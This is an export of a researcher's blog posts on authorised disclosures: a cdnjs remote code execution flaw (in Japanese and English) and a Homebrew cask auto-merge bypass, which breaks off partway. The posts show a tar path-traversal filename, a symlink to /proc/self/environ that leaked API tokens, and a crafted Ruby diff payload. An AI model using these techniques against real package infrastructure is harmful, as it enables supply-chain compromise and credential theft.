[{"content":"はじめに (English version is also available.)\ncdnjsの運営元であるCloudflareは、HackerOne上で脆弱性開示制度(Vulnerability Disclosure Program)を設けており、脆弱性の診断行為を許可しています。\n本記事は、当該制度を通して報告された脆弱性をCloudflareセキュリティチームの許可を得た上で公開しているものであり、無許可の脆弱性診断行為を推奨することを意図したものではありません。\nCloudflareが提供する製品に脆弱性を発見した場合は、Cloudflareの脆弱性開示制度へ報告してください。\n要約 cdnjsのライブラリ更新用サーバーに任意のコードを実行することが可能な脆弱性が存在し、結果としてcdnjsを完全に侵害することが出来る状態だった。\nこれにより、インターネット上のウェブサイトの内12.7%1を改竄することが可能となっていた。\ncdnjsとは cdnjsは、Cloudflareによって運営されている無料のJavaScript/CSSライブラリ用CDNであり、記事公開時点でインターネット上のウェブサイトの12.7%に使用されている。\nこれは、Google Hosted Librariesの12.8%2に次いで2番目に広く使われているライブラリ用CDNであり、現在の使用率の推移を鑑みるに、近いうちに最も使われているJavaScriptライブラリ用CDNになると考えられる。\n2021年7月15日時点でのW3Techsにおけるcdnjsの使用率グラフ\n 調査理由 前回の「Homebrewにおける任意コード実行」に関する調査を行う数週間前に、サプライチェーン攻撃に関する調査を行っていた。\n多数のアプリケーションが依存するシステムであり、脆弱性調査を許可しているという条件で絞り込んだ際に、cdnjsが対象に入ったため調査を行うことにした。\n初期調査 cdnjsのウェブサイトを眺めている際に、以下のような記述を発見した。\n Couldn\u0026rsquo;t find the library you\u0026rsquo;re looking for?\nYou can make a request to have it added on our GitHub repository.\n GitHubのリポジトリ上でライブラリの情報を管理している事がわかったため、当該のGitHub Organizationのリポジトリを確認した。\n結果として、以下のような構成になっていることがわかった。\n cdnjs/packages: cdnjsに掲載するライブラリの情報を格納 cdnjs/cdnjs: ライブラリの実際のファイル群を格納 cdnjs/logs: ライブラリの更新ログを格納 cdnjs/SRIs: 各ライブラリのSRI(Subresource Integrity)を格納 cdnjs/static-website: cdnjs.comのソースコード cdnjs/origin-worker: cdnjs.cloudflare.comのオリジン用Cloudflare Worker cdnjs/tools: cdnjsの管理用ツール cdnjs/bot-ansible: cdnjsの自動ライブラリ更新用システムのAnsible  これらのリポジトリから分かるように、cdnjsのインフラの大部分はこのGitHub Organizationに集約されている。\nその中で、cdnjs/bot-ansibleとcdnjs/toolsに興味を惹かれた。\nこの2つのリポジトリのコードを読んだ所、cdnjs/bot-ansibleが定期的にcdnjs/toolsのautoupdateコマンドをライブラリ更新用サーバー内で実行し、cdnjs/packagesにおいて指定されているGitリポジトリ/npmパッケージを用いて更新を確認していることがわかった。\n自動更新機能の調査 この自動更新機能は、ユーザーが管理するGitリポジトリ/npmパッケージをダウンロードし、対象のファイルをコピーすることによってライブラリを更新していた。\nnpmレジストリは、各ライブラリを.tgzファイルとして圧縮した上でダウンロードができるようにしている。\nこの自動更新用のツールがGoで記述されていることから、Goのcompress/gzip及びarchive/tarを用いて解凍しているのではないかと推測した。\nGoのarchive/tarはアーカイブ内に含まれるファイルパスをサニタイズせずに返す3ため、もし仮にarchive/tarから返されたファイル名を元にしてディスク上に書き込んでいる場合、../../../../../../../../../tmp/testのようなファイル名を持つファイルを.tgzに含めることにより、任意のファイルを上書きできる。4\ncdnjs/bot-ansibleの情報から、いくつかのスクリプトが定期的に実行されており、それらに対して書き込み権限があることがわかっていたため、パストラバーサルを介したファイルの上書きを重点的に確認することにした。\nパストラバーサル パストラバーサルを探すために、autoupdateコマンドのmain関数を読み始めた。\nfunc main() { [...]\tswitch *pckg.Autoupdate.Source { case \u0026quot;npm\u0026quot;: { util.Debugf(ctx, \u0026quot;running npm update\u0026quot;) newVersionsToCommit, allVersions = updateNpm(ctx, pckg) } case \u0026quot;git\u0026quot;: { util.Debugf(ctx, \u0026quot;running git update\u0026quot;) newVersionsToCommit, allVersions = updateGit(ctx, pckg) } [...] }  上記のコードから分かるように、npmをベースとした自動更新が指定されていた場合は、updateNpm関数へとパッケージ情報を渡している。\nfunc updateNpm(ctx context.Context, pckg *packages.Package) ([]newVersionToCommit, []version) { [...] newVersionsToCommit = doUpdateNpm(ctx, pckg, newNpmVersions) [...] }  そして、新しいライブラリバージョンの情報と共にdoUpdateNpm関数を呼び出す。\nfunc doUpdateNpm(ctx context.Context, pckg *packages.Package, versions []npm.Version) []newVersionToCommit { [...] for _, version := range versions { [...] tarballDir := npm.DownloadTar(ctx, version.Tarball) filesToCopy := pckg.NpmFilesFrom(tarballDir) [...] }  次に、npm.DownloadTar関数へ新しいバージョンの.tgzファイルのURLを渡す。\nfunc DownloadTar(ctx context.Context, url string) string { dest, err := ioutil.TempDir(\u0026quot;\u0026quot;, \u0026quot;npmtarball\u0026quot;) util.Check(err) util.Debugf(ctx, \u0026quot;download %s in %s\u0026quot;, url, dest) resp, err := http.Get(url) util.Check(err) defer resp.Body.Close() util.Check(Untar(dest, resp.Body)) return dest }  最後に、http.Getを使用して取得した.tgzファイルを、Untar関数へと渡す。\nfunc Untar(dst string, r io.Reader) error { gzr, err := gzip.NewReader(r) if err != nil { return err } defer gzr.Close() tr := tar.NewReader(gzr) for { header, err := tr.Next() [...] // the target location where the dir/file should be created target := filepath.Join(dst, removePackageDir(header.Name)) [...] // check the file type switch header.Typeflag { [...] // if it's a file create it case tar.TypeReg: { [...] f, err := os.OpenFile(target, os.O_CREATE|os.O_RDWR, os.FileMode(header.Mode)) [...] // copy over contents if _, err := io.Copy(f, tr); err != nil { return err } } } } }  予想通り、Untar関数内においてcompress/gzipとarchive/tarを使用して解凍を行っていた。\n最初はremovePackageDirにおいてパスのサニタイズを行っているのだと考えていたのだが、関数の内容を確認した所、単純にpackage/という文字列をパスから削除するだけの関数だった。\nこれにより、npmへ公開した.tgzファイルからパストラバーサルを行い、サーバー上で定期的に実行されるスクリプトを上書きした上で任意のコードが実行できるということがわかった。\n脆弱性のデモンストレーション CloudflareはHackerOne上に脆弱性開示制度を持っているため、脆弱性が実際に攻撃可能であることを示さなければ、HackerOneのトリアージチームがCloudflare側にレポートを転送しない可能性が高い。\nそのため、脆弱性が実際に攻撃出来ることを示すためにデモンストレーションを行うことにした。\n攻撃手順としては、以下のとおりとなる。\n 細工したファイル名を含む.tgzファイルをnpm上で公開する。 cdnjsの自動更新サーバーがファイルを処理するのを待つ。 細工した.tgzファイルの中身が定期実行されているスクリプトファイルへと書き込まれ、任意のコードが実行される。  \u0026hellip;と、ここまで考えた所でGitリポジトリをベースとした自動更新機能が気になってきた。\nそのため、脆弱性のデモンストレーションを行う前にコードを流し読みした所、以下のコードのように、Gitリポジトリからファイルをコピーする際に、シンボリックリンクの存在が考慮されていないように見受けられた。\nfunc MoveFile(sourcePath, destPath string) error { inputFile, err := os.Open(sourcePath) if err != nil { return fmt.Errorf(\u0026quot;Couldn't open source file: %s\u0026quot;, err) } outputFile, err := os.Create(destPath) if err != nil { inputFile.Close() return fmt.Errorf(\u0026quot;Couldn't open dest file: %s\u0026quot;, err) } defer outputFile.Close() _, err = io.Copy(outputFile, inputFile) inputFile.Close() if err != nil { return fmt.Errorf(\u0026quot;Writing to output file failed: %s\u0026quot;, err) } // The copy was successful, so now delete the original file err = os.Remove(sourcePath) if err != nil { return fmt.Errorf(\u0026quot;Failed removing original file: %s\u0026quot;, err) } return nil }  Gitはシンボリックリンクを扱うことが可能なため、Gitリポジトリにシンボリックリンクを含め、cdnjsに処理させることによりcdnjsシステム上の任意のファイルを読み取れる可能性がある。\nファイルを上書きして任意のコードを実行するように書き換えた場合、自動更新機能が適切に動作しなくなってしまう可能性があったため、シンボリックリンクによる任意ファイル読み取りを先に検証/報告し、パストラバーサルに関してはそのレポート内でCloudflareのセキュリティチームに確認後、デモンストレーションを行おうと考えた。\nこれに伴い、攻撃手順を以下のように変更した。\n cdnjsに登録されたGitリポジトリに、無害なファイル(ここでは/proc/self/mapsを想定)へとリンクさせたシンボリックリンクを追加する。 当該のGitリポジトリ上で、新しいバージョンを公開する。 cdnjsの自動更新サーバーがファイルを処理するのを待つ。 指定したファイルが読み取られ、公開される。  この時点で20時頃だったのだが、シンボリックリンクを作成するだけであれば直ぐに済ませられると考え、シンボリックリンクを作成/プッシュしてから夕飯を食べることにした。5\nln -s /proc/self/maps test.js  インシデント 夕飯を済ませ、PCの前に戻ってきた所、cdnjsがシンボリックリンクを含むバージョンを公開していることが確認できた。\nその後、レポートを送信するためにファイル内容を確認して驚愕した。\nなんと、GITHUB_REPO_API_KEYや、WORKERS_KV_API_TOKENといった明らかに機微な情報が表示されていたのである。\n一瞬何が起こったのか理解できず、コマンドのログを確かめた所、誤って/proc/self/mapsではなく/proc/self/environへのリンクを貼っていたことが確認できた。6\n先述の通り、cdnjsのGitHub Organizationが侵害された場合、cdnjsの大部分を侵害することが可能となる。\nすぐにでも対応する必要があったため、レポートには現在の状況がわかるリンクとトークン類を全て取り消して欲しいという旨のみを記載し、送信した。\nこの時点ではとても焦っており確認していなかったが、実はレポートを送信する前にこれらのトークンは無効化されていた。\nこれは後からわかったことだが、GITHUB_REPO_API_KEY(GitHubのAPIキー)が含まれていたことにより、即座にGitHubが自動で通知を行い、それを受け取ったCloudflareはインシデントレスポンスを開始していたらしい。\ncdnjsが細工されたパッケージを処理してから数分も立たない内に各種認証情報の無効化を行っていたらしく、流石Cloudflareだな、という印象を受けた。\n影響調査 その後、詳細な影響範囲の調査を行った。\nGITHUB_REPO_API_KEYはcdnjsのGitHub Organizationに所属しているrobocdnjsというアカウントのアクセストークンであり、cdnjsの各リポジトリに対する書き込み権限を持っていた。\nつまり、cdnjs上でホストされている任意のライブラリの改竄や、ウェブサイトの改竄などをこのトークンを用いて行うことができた。\nまた、WORKERS_KV_API_TOKENは、cdnjsに使用されているCloudflare WorkersのKVに対する書き込み権限を持っており、KVにキャッシュされたライブラリ情報を改竄することが可能だった。\nこれらの権限を組み合わせることにより、cdnjsのオリジンデータからKVキャッシュ、更にはcdnjsのウェブサイトといったcdnjsのコア部分を完全に侵害することができたと考えられる。\nまとめ 今回の記事では、cdnjsに存在した脆弱性について解説しました。\n脆弱性自体は特殊なスキル無しで悪用可能なものでしたが、それによって潜在的に生じる影響が非常に大きいものでした。 世の中にはこの脆弱性のような、悪用が簡単なのにも関わらず、影響が非常に大きい脆弱性がサプライチェーンの中にあると考えると、非常に恐ろしいものだと感じます。\n本記事に関する質問/感想はTwitter(@ryotkak)へメッセージを送信してください。\nタイムライン    日付 (日本時間) 出来事     2021/04/06 19時頃 脆弱性の発見、検証開始   2021/04/06 20時頃 デモンストレーション用のファイルを公開   2021/04/06 20時半頃 cdnjsがファイルを処理   同時刻 GitHubがアラートをCloudflareへ送信   同時刻 Cloudflare内部でインシデントレスポンスが始まる   数分以内 各種認証情報の取り消しが完了する   2021/04/06 20時40分頃 初期レポートを送信   2021/04/06 21時頃 詳細なレポートを送信   2021/04/07～ 二次対応が完了   2021/06/03 完全な対応が完了   2021/07/16 本記事の公開      W3Techsより7月15日の情報を引用。SRI/キャッシュの存在により、即座に改竄可能だったウェブサイトはこの数字よりも少なかった。 \u0026#x21a9;\u0026#xfe0e;\n W3Techsより7月15日時点の情報を引用。 \u0026#x21a9;\u0026#xfe0e;\n https://github.com/golang/go/issues/25849 \u0026#x21a9;\u0026#xfe0e;\n このようなアーカイブファイルは、evilarcといったようなツールを用いることにより作成することが出来る。 \u0026#x21a9;\u0026#xfe0e;\n 記憶が定かではないが、この日の夕食は冷凍餃子だったと思う。 \u0026#x21a9;\u0026#xfe0e;\n 仕事で疲れていたのと、空腹だった事が重なり、ろくに確認もせずに補完されたコマンドを実行してしまっていた。 \u0026#x21a9;\u0026#xfe0e;\n   ","date":"2021-07-16","permalink":"https://blog.ryotak.me/post/cdnjs-remote-code-execution/","tags":["cdnjs","脆弱性","Go","Supply Chain","RCE"],"title":"Cloudflareのcdnjsにおける任意コード実行"},{"content":"Preface (日本語版も公開されています。)\nCloudflare, which runs cdnjs, is running a \u0026ldquo;Vulnerability Disclosure Program\u0026rdquo; on HackerOne, which allows hackers to perform vulnerability assessments.\nThis article describes vulnerabilities reported through this program and published with the permission of the Cloudflare security team.\nSo this article is not intended to recommend you to perform an unauthorized vulnerability assessment.\nIf you found any vulnerabilities in Cloudflare\u0026rsquo;s product, please report it to Cloudflare\u0026rsquo;s vulnerability disclosure program.\nTL;DR There was a vulnerability in the cdnjs library update server that could execute arbitrary commands, and as a result, cdnjs could be completely compromised.\nThis allows an attacker to tamper 12.7%1 of all websites on the internet once caches are expired.\nAbout cdnjs cdnjs is a JavaScript/CSS library CDN that is owned by Cloudflare, which is used by 12.7% of all websites on the internet as of 15 July 2021.\nThis is the second most widely used library CDN after 12.8%2 of Google Hosted Libraries, and considering the current usage rate, it will be the most used JavaScript library CDN in the near future.\nUsage graph of cdnjs from W3Techs, as of 15 July 2021\n Reason for investigation A few weeks before my last investigation into \u0026ldquo;Remote code execution in Homebrew by compromising the official Cask repository\u0026rdquo;, I was investigating supply chain attacks.\nWhile finding a service that many software depends on, and is allowing users to perform the vulnerability assessment, I found cdnjs. So I decided to investigate it.\nInitial investigation While browsing the cdnjs website, I found the following description.\n Couldn\u0026rsquo;t find the library you\u0026rsquo;re looking for?\nYou can make a request to have it added on our GitHub repository.\n I found out that the library information is managed on the GitHub repository, so I checked the repositories of the GitHub Organization that is used by cdnjs.\nAs a result, it was found that the repository is used in the following ways.\n cdnjs/packages: Stores library information that is supported in cdnjs cdnjs/cdnjs: Stores files of libraries cdnjs/logs: Stores update logs of libraries cdnjs/SRIs: Stores SRI (Subresource Integrity) of libraries cdnjs/static-website: Source code of cdnjs.com cdnjs/origin-worker: Cloudflare Worker for origin of cdnjs.cloudflare.com cdnjs/tools: cdnjs management tools cdnjs/bot-ansible: Ansible repository of the cdnjs library update server  As you can see from these repositories, most of the cdnjs infrastructure is centralized in this GitHub Organization.\nI was interested in cdnjs/bot-ansible and cdnjs/tools because it automates library updates.\nAfter reading codes of these 2 repositories, it turned out cdnjs/bot-ansible executes autoupdate command of cdnjs/tools in the cdnjs library update server periodically, to check updates of library from cdnjs/packages by downloading npm package / Git repository.\nInvestigation of automatic update The automatic update function updates the library by downloading the user-managed Git repository / npm package and copying the target file from them.\nAnd npm registry compress libraries into .tgz to make it downloadable.\nSince the tool for this automatic update is written in Go, I guessed that it may use Go\u0026rsquo;s compress/gzip and archive/tar to extract the archive file.\nGo\u0026rsquo;s archive/tar returns the filename contained in the archive without sanitizing3, so if the archive is extracted into the disk based on the filename returned from archive/tar, archives that contain filename like ../../../../../../../tmp/test may overwrite arbitrary files on the system. 4\nFrom the information in cdnjs/bot-ansible, I knew that some scripts were running regularly and the user that runs the autoupdate command had write permission for them, so I focused on overwriting files via path traversal.\nPath traversal To find path traversal, I started reading the main function of the autoupdate command.\nfunc main() { [...] switch *pckg.Autoupdate.Source { case \u0026quot;npm\u0026quot;: { util.Debugf(ctx, \u0026quot;running npm update\u0026quot;) newVersionsToCommit, allVersions = updateNpm(ctx, pckg) } case \u0026quot;git\u0026quot;: { util.Debugf(ctx, \u0026quot;running git update\u0026quot;) newVersionsToCommit, allVersions = updateGit(ctx, pckg) } [...] }  As you can see from the code snippet above, if npm is specified as a source of auto-update, it passes package information to the updateNpm function.\nfunc updateNpm(ctx context.Context, pckg *packages.Package) ([]newVersionToCommit, []version) { [...] newVersionsToCommit = doUpdateNpm(ctx, pckg, newNpmVersions) [...] }  Then, updateNpm passes information about the new library version to doUpdateNpm function.\nfunc doUpdateNpm(ctx context.Context, pckg *packages.Package, versions []npm.Version) []newVersionToCommit { [...] for _, version := range versions { [...] tarballDir := npm.DownloadTar(ctx, version.Tarball) filesToCopy := pckg.NpmFilesFrom(tarballDir) [...] }  And doUpdateNpm passes the URL of .tgz file into npm.DownloadTar.\nfunc DownloadTar(ctx context.Context, url string) string { dest, err := ioutil.TempDir(\u0026quot;\u0026quot;, \u0026quot;npmtarball\u0026quot;) util.Check(err) util.Debugf(ctx, \u0026quot;download %s in %s\u0026quot;, url, dest) resp, err := http.Get(url) util.Check(err) defer resp.Body.Close() util.Check(Untar(dest, resp.Body)) return dest }  Finally, pass the .tgz file obtained using http.Get to the Untar function.\nfunc Untar(dst string, r io.Reader) error { gzr, err := gzip.NewReader(r) if err != nil { return err } defer gzr.Close() tr := tar.NewReader(gzr) for { header, err := tr.Next() [...] // the target location where the dir/file should be created target := filepath.Join(dst, removePackageDir(header.Name)) [...] // check the file type switch header.Typeflag { [...] // if it's a file create it case tar.TypeReg: { [...] f, err := os.OpenFile(target, os.O_CREATE|os.O_RDWR, os.FileMode(header.Mode)) [...] // copy over contents if _, err := io.Copy(f, tr); err != nil { return err } } } } }  As I guessed, compress/gzip and archive/tar were used in Untar function to extract .tgz file.\nAt first, I thought that it\u0026rsquo;s sanitizing the path in the removePackageDir function, but when I checked the contents of the function, I noticed that it\u0026rsquo;s just removing package/ from the path.\nFrom these code snippets, I confirmed that arbitrary code can be executed after performing path traversal from the .tgz file published to npm and overwriting the script that is executed regularly on the server.\nDemonstration of vulnerability Because Cloudflare is running a vulnerability disclosure program on HackerOne, it\u0026rsquo;s likely that HackerOne\u0026rsquo;s triage team won\u0026rsquo;t forward the report to Cloudflare unless it indicates that the vulnerability is actually exploitable. Therefore, I decided to do a demonstration to show that vulnerability can actually be exploited.\nThe attack procedure is as follows.\n Publish the .tgz file that contains the crafted filename to the npm registry. Wait for the cdnjs library update server to process the crafted .tgz file. The contents of the file that is published in step 1 are written into a regularly executed script file and arbitrary command is executed.  \u0026hellip; and after writing the attack procedure into my notepad, for some reason, I started wondering how automatic updates based on the Git repository works.\nSo, I read codes a bit before demonstrating the vulnerability, and it seemed that the symlinks aren\u0026rsquo;t considered when copying files from the Git repository.\nfunc MoveFile(sourcePath, destPath string) error { inputFile, err := os.Open(sourcePath) if err != nil { return fmt.Errorf(\u0026quot;Couldn't open source file: %s\u0026quot;, err) } outputFile, err := os.Create(destPath) if err != nil { inputFile.Close() return fmt.Errorf(\u0026quot;Couldn't open dest file: %s\u0026quot;, err) } defer outputFile.Close() _, err = io.Copy(outputFile, inputFile) inputFile.Close() if err != nil { return fmt.Errorf(\u0026quot;Writing to output file failed: %s\u0026quot;, err) } // The copy was successful, so now delete the original file err = os.Remove(sourcePath) if err != nil { return fmt.Errorf(\u0026quot;Failed removing original file: %s\u0026quot;, err) } return nil }  As Git supports symbolic links by default, it may be possible to read arbitrary files from the cdnjs library update server by adding symlink into the Git repository.\nIf the regularly executed script file is overwritten to execute arbitrary commands, the automatic update function may be broken, so I decided to check the arbitrary file reading first. Along with this, the attack procedure was changed as follows.\n Add a symbolic link that points harmless file (Assumed /proc/self/maps here) into the Git repository. Publish a new version in the repository. Wait for the cdnjs library update server to process the crafted repository. The specified file is published on cdnjs.  It was around 20:00 at this point, but what I have to do was creating a symlink, so I decided to eat dinner after creating the symbolic link and publishing it.5\nln -s /proc/self/maps test.js  Incident Once I finished the dinner and returning to my PC desk, I was able to confirm that cdnjs has released a version containing symbolic links.\nAfter checking the contents of the file to send the report, I was surprised.\nSurprisingly, clearly sensitive information such as GITHUB_REPO_API_KEY and WORKERS_KV_API_TOKEN was displayed.\nI couldn\u0026rsquo;t understand what happened for a moment, and when I checked the command log, I found that I accidentally put a link to /proc/self/environ instead of /proc/self/maps.6\nAs mentioned earlier, if cdnjs' GitHub Organization is compromised, it\u0026rsquo;s possible to compromise most of the cdnjs infrastructure.\nI needed to take immediate action, so I sent the report that only contains a link that shows the current situation, and requested them to revoke all credentials.\nAt this point, I was very confused and hadn\u0026rsquo;t confirmed it, but in fact, these tokens were invalidated before I sent the report.\nIt seems that GitHub notified Cloudflare immediately because GITHUB_REPO_API_KEY (API key of GitHub) was included in the repository, and Cloudflare started incident response immediately after the notification.\nI felt that they\u0026rsquo;re a great security team because they invalidated all credentials within minutes after cdnjs processed the specially crafted repository.\nDeterminate impact After the incident, I investigated what could be impacted.\nGITHUB_REPO_API_KEY was an API key for robocdnjs, which belongs to cdnjs organization, and had write permission against each repository.\nThis means it was possible to tamper arbitrary libraries on the cdnjs or tamper the cdnjs.com itself.\nAlso, WORKERS_KV_API_TOKEN had permission against KV of Cloudflare Workers that is used in the cdnjs, it could be used to tamper the libraries on the KV cache.\nBy combining these permissions, the core part of cdnjs, such as the origin data of cdnjs, the KV cache, and even the cdnjs website, could be completely tampered.\nConclusion In this article, I described the vulnerability that was existed in cdnjs.\nWhile this vulnerability could be exploited without any special skills, it could impact many websites.\nGiven that there are many vulnerabilities in the supply chain, which are easy to exploit but have a large impact, I feel that it\u0026rsquo;s very scary.\nIf you have any questions/comments about this article, please send a message to @ryotkak on Twitter.\nTimeline    Date (JST) Event     April 6, 2021 19:00 Found a vulnerability   April 6, 2021 20:00 Published a crafted symlink   April 6, 2021 20:30 cdnjs processed the file   At the same time GitHub sent an alert to Cloudflare   At the same time Cloudflare started an incident response   Within minutes Cloudflare finished revocation of credentials   April 6, 2021 20:40 I sent an initial report   April 6, 2021 21:00 I sent detailed report   April 7, 2021- Secondary fix has applied   June 3, 2021 Complete fix has applied   July 16, 2021 Published this article      Quoted from W3Techs as of 15 July 2021. Due to the presence of SRI / cache, fewer websites could tamper immediately. \u0026#x21a9;\u0026#xfe0e;\n Quoted from W3Techs as of 15 July 2021. \u0026#x21a9;\u0026#xfe0e;\n https://github.com/golang/go/issues/25849 \u0026#x21a9;\u0026#xfe0e;\n Archives like this can be created by using tools such as evilarc. \u0026#x21a9;\u0026#xfe0e;\n I don\u0026rsquo;t know if this is correct, but I remember that the dinner on that day was frozen gyoza (dumplings). (It was yummy!) \u0026#x21a9;\u0026#xfe0e;\n Because I was tired from work and I was hungry, I ran the command completed by shell without any confirmation. \u0026#x21a9;\u0026#xfe0e;\n   ","date":"2021-07-16","permalink":"https://blog.ryotak.me/post/cdnjs-remote-code-execution-en/","tags":["cdnjs","Vulnerability","Go","Supply Chain","RCE"],"title":"Remote code execution in cdnjs of Cloudflare"},{"content":"English version is available here: https://blog.ryotak.me/post/homebrew-security-incident-en/\n(公式インシデント報告はこちらから読むことができます: https://brew.sh/2021/04/21/security-incident-disclosure/)\nはじめに HomebrewプロジェクトはHackerOne上で脆弱性開示制度(Vulnerability Disclosure Program)を設けており、脆弱性の診断行為が許可されています。\n本記事は、当該制度に参加し、Homebrewプロジェクトのスタッフから許可を得た上で実施した脆弱性診断行為について解説したものであり、無許可の脆弱性診断行為を推奨することを意図したものではありません。\nHomebrewに脆弱性を発見した場合は、Homebrewプロジェクトの脆弱性開示制度へ報告してください。\n要約 HomebrewのCaskを管理しているリポジトリにおいて、プルリクエストの自動レビュー機能に使用されているライブラリにバグが存在し、結果として自動レビュー機能に悪意のないプルリクエストだと誤判定させることが可能だった。\nこれにより、悪意のあるコードをHomebrew/homebrew-caskへ自動的にマージし、Homebrewを利用しているユーザーのコンピューター上で任意のRubyコードを実行することができた。\n調査理由 とある日の午後、次の予定までの時間が微妙に空いていた1ため、HackerOne上で面白そうなプログラムを探すことにした。\n自分が利用しているサービス/ソフトウェアの脆弱性を優先して探したいと思ったため、手元のPCの中を漁っていると、brewコマンドに目が行った。\n以前、HackerOne上のプログラム一覧を眺めているときに、Homebrewというプログラムを見かけたことを思い出し、せっかくなので脆弱性を探すことにした。\n調査対象の選定 調査する対象を選定するために、脆弱性開示制度のポリシーページを確認すると、brewコマンド本体の他にHomebrew/homebrew-*にマッチするGitHubリポジトリに関する脆弱性報告を受け付けていることに気がついた。\n複雑なRubyのコードを読むのが苦手なので、ひとまずHomebrew/homebrew-*における脆弱性を探すことにした。\n初期調査 GitHubリポジトリにおける脆弱性は、主に以下の2つが多いように思われる。\n 当該のリポジトリに対する書き込み権限を持ったトークンの漏洩 当該のリポジトリが利用しているCIスクリプトにおける脆弱性  そのため、これら2つの脆弱性に絞り、脆弱性を確認していくことにした。\n1つ目に関して確認するために、Homebrewに所属しているユーザーが所有しているリポジトリをすべて取得し、それらの中からトークンと思わしき文字列を抽出していった。\nしかしながら、この方法での脆弱性が見つかるのは非常に稀であり、当然有効なトークンは見つからなかった。2\nそのため、2つ目に関連した脆弱性が無いかどうか確認することにした。\nCIスクリプトの調査 Homebrewは、CIスクリプトを実行するためにGitHub Actionsを使用している。3\nそのため、各リポジトリの.github/workflows/配下のファイルを調べていくことにした。\nいくつかのリポジトリを確認した後、Homebrew/homebrew-caskに置かれていたreview.ymlと、automerge.ymlに非常に強い関心を持った。\nどうやら、review.ymlがユーザーが送信したプルリクエストの内容を確認し、そのプルリクエストが非常に単純な変更(例: バージョンアップなど)のみを加える場合、自動でプルリクエストを承認し、その後automerge.ymlが承認されたプルリクエストを自動でマージしているようだった。\nreview.ymlの調査 review.ymlが利用しているRubyスクリプト4は変更点をdiffファイルとして取得し、それをgit_diffというGemを用いてパースする。\nその後、以下の条件を満たしている場合にのみプルリクエストを承認していた。\n 変更中のファイルが1つのみ ファイルを移動/新規作成/削除していない 変更中のファイルパスが\\ACasks/[^/]+\\.rb\\Zにマッチする 削除した行数と追加した行数が同数 削除/追加した行の全てが/\\A[+-]\\s*version \u0026quot;([^\u0026quot;]+)\u0026quot;\\Z/か\\A[+-]\\s*sha256 \u0026quot;[0-9a-f]{64}\u0026quot;\\Zのどちらかにマッチする バージョンが変更される場合、フォーマットが以前と同様 (例: 1.2.3 =\u0026gt; 2.3.4)  \u0026hellip;等5\n条件を精査したが、非常に厳密な条件だったため脆弱性は見つからず、この条件下で任意のコードを挿入するのは不可能であると結論付けた。\nその後、しばらく他のスクリプトの確認を行っていたのだが、どういうわけかこのスクリプトの事が頭から離れなかった。\nそのため、このスクリプトを徹底的に調べることにし、diffファイルのパースを行っているライブラリを調べ始めた。\ngit_diffの調査 git_diffのリポジトリを眺めている際に、変更された行数のパースが間違っているという旨のIssueを発見した。\nこのIssueを見て、どうにかしてgit_diffを混乱させ、上記の条件を満たすように偽装できないかと考え始めた。\n詳しくコードを読んでいくと、どうやらgit_diffは以下のような処理を行いdiffファイルをパースしているようだった。\n ファイルの内容を改行区切りで分割する それぞれの行に対して、^diff --git(?: a/(\\S+))?(?: b/(\\S+))?がマッチするかどうかを確認し、マッチすればファイル情報として判定し、現在処理中のファイル情報を正規表現にマッチしたものに置き換える。 2でマッチしなければ、以下の正規表現にマッチするかを確認、マッチしていれば変更元/変更先のファイルパスを内容に応じて書き換える。  3でマッチしなければ、ファイル自体の変更として扱い、+で始まっていれば追加、-で始まっていれば削除、それ以外は元々のファイル内容として扱う。 上記を繰り返し、全ての行を処理し次第終了する。  一見問題ないように見えるこの処理だが、3の移動元/移動先ファイルパスにマッチするかどうかの判定を複数回走らせることが可能となっていた。\nGitHubが返すdiffファイルは、以下の構造の変更データをファイルごとに作成し、それを単一ファイルに纏めたものとなっている。\ndiff --git a/変更前のファイルパス b/変更後のファイルパス index 親コミットハッシュ..現コミットハッシュ ファイルモード --- a/変更前のファイルパス +++ b/変更後のファイルパス @@ 行情報 @@ 以下変更詳細 (例: `+asdf`、`-zxcv`等)  行追加に関しては、追加された行の前に+を追加することにより表現される。\nつまり、++ \u0026quot;?b/(.*)にマッチする行であれば、ファイル内容の変更ではなく変更中のファイルパス情報として認識されてしまう状態だった。\nここで、先程の条件を確認すると、変更中のファイルパスに対する条件は\\ACasks/[^/]+\\.rb\\Zだけとなっている。\n先述の通りファイルパス情報変更は複数回行えるため、以下のような変更を加えることにより上記の条件を回避し、変更された行が0行の無害なプルリクエストと判定させることができる可能性が高かった。6\n++ \u0026quot;b/#{ここに任意のコード}\u0026quot; ++ b/Casks/cask.rb  デモンストレーションの準備 HackerOne等のバグバウンティプラットフォームは、基本的にPoCや脆弱性のデモンストレーションをレポート内で送信する必要がある。\nそのため、この脆弱性が実際に悪用可能かどうかを確かめることにした。　実際に使用されているCaskを許可なく変更するのはあまりよろしくないため、homebrew-cask内において、テスト用のCaskを探すことにした。\nしかしながら、テスト用のCaskが見つからなかったため、仕方なくHomebrewの脆弱性開示制度を担当している方にメールを送信した。\nその後、担当している方からこれだけのためにテスト用のCaskを追加する無理なので、代わりに既存のCaskに無害な変更を加えてくれという旨の返信が帰ってきた。\nそのため、適当なCaskを選び、無害な変更を加えることにした。\n脆弱性のデモンストレーション この日の前日にGitHubのAPI Tokenをうっかり載せてしまったプルリクエストを見かけていたため、このプルリクエストが変更しようとしていたiterm2.rbに対して変更を加えることにした。\n変更を加える際に気がついたのだが、++ \u0026quot;b/\u0026quot;はRubyの文法として間違っていないが、++ b/Casks/iterm2.rbは変数を定義しないとエラーになってしまう。\nそのため、Homebrew/homebrew-caskをフォークし、以下の2行をCasks/iterm2.rbへ追記した。7\n++ \u0026quot;b/#{puts 'Going to report it - RyotaK (https://hackeorne.com/ryotak)';b = 1;Casks = 1;iterm2 = {};iterm2.define_singleton_method(:rb) do 1 end}\u0026quot; ++ b/Casks/iterm2.rb  一行目でb、Casks、iterm2、iterm2.rbを定義することにより、二行目でエラーが発生しなくなるため、有効なRubyスクリプトとして実行することができるようになる。\nそして、この変更を加えることにより、GitHubは以下のようなDiffを返す。\ndiff --git a/Casks/iterm2.rb b/Casks/iterm2.rb index 3c376126bb1cf9..ba6f4299c1824e 100644 --- a/Casks/iterm2.rb +++ b/Casks/iterm2.rb @@ -8,6 +8,8 @@ sha256 \u0026quot;e7403dcc5b08956a1483b5defea3b75fb81c3de4345da6000e3ad4a6188b47df\u0026quot; end +++ \u0026quot;b/#{puts 'Going to report it - RyotaK (https://hackeorne.com/ryotak)';b = 1;Casks = 1;iterm2 = {};iterm2.define_singleton_method(:rb) do 1 end}\u0026quot; +++ b/Casks/iterm2.rb url \u0026quot;https://iterm2.com/downloads/stable/iTerm2-#{version.dots_to_underscores}.zip\u0026quot; name \u0026quot;iTerm2\u0026quot; desc \u0026quot;Terminal emulator as alternative to Apple's Terminal app\u0026quot;  